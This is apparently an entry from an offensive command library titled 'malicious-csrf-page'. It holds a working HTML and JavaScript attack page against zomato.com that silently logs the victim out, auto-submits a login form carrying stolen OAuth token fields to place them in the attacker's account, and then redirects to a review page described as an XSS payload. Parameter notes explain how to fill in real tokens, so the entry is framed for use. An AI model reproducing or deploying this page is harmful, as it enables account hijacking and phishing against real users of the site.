---
id: cmd-632017-03
data: >-
  <form target="attackerTokens" method="post"
  action="https://www.zomato.com/php/asyncLogin.php?access_token=██████"><input
  name='authResponse[accessToken]' value='█████'><input
  name='authResponse[userID]' value='███'><input name='authResponse[expiresIn]'
  value='5073'><input name='authResponse[signedRequest]' value='████'><input
  name='authResponse[reauthorize_required_in]' value='7774406'><input
  name='authResponse[data_access_expiration_time]' value='1569568133'><input
  type=submit></form><iframe name="attackerTokens"></iframe><!-- logout current
  session --><img
  src="https://www.zomato.com/logout"><script>setTimeout(function(){
  document.forms[0].submit();},1500);// login attackers account
  setTimeout(function(){
  window.location.href='http://zoma.to/link_to_review';},4000);// redirect to
  XSS payload page</script>
tags:
  - csrf
  - html
  - phishing
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.929Z'
verified: false
validated: true
submitted: true
---
# malicious-csrf-page

## Command

```html
<form target="attackerTokens" method="post" action="https://www.zomato.com/php/asyncLogin.php?access_token=██████">
<input name='authResponse[accessToken]' value='█████'>
<input name='authResponse[userID]' value='███'>
<input name='authResponse[expiresIn]' value='5073'>
<input name='authResponse[signedRequest]' value='████'>
<input name='authResponse[reauthorize_required_in]' value='7774406'>
<input name='authResponse[data_access_expiration_time]' value='1569568133'>
<input type=submit>
</form>
<iframe name="attackerTokens"></iframe>
<!-- logout current session -->
<img src="https://www.zomato.com/logout">
<script>
setTimeout(function(){ document.forms[0].submit();},1500);// login attackers account
setTimeout(function(){ window.location.href='http://zoma.to/link_to_review';},4000);// redirect to XSS payload page
</script>
```

## Description

HTML page for CSRF chain: logs out via img, submits login form with stolen tokens, redirects to XSS review.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| action URL | Login endpoint | Yes |
| input values | Captured authResponse fields | Yes |
| img src | Logout URL | Yes |
| window.location.href | XSS review link | Yes |
| setTimeout delays | Timing in ms (1500 for submit, 4000 for redirect) | Yes |

## Examples

### Basic Usage

```html
<form method="post" action="/login"><input type=submit></form><img src="/logout">
```

### Advanced Usage

```html
# Full page as above with real tokens
```

## Expected Output

Auto-logout, form submit (200 response in iframe), redirect to review page.

## Related

- [[commands/xss-payload-fb-token-steal]]
- [[procedures/Craft-Malicious-Auto-Login-Page]]
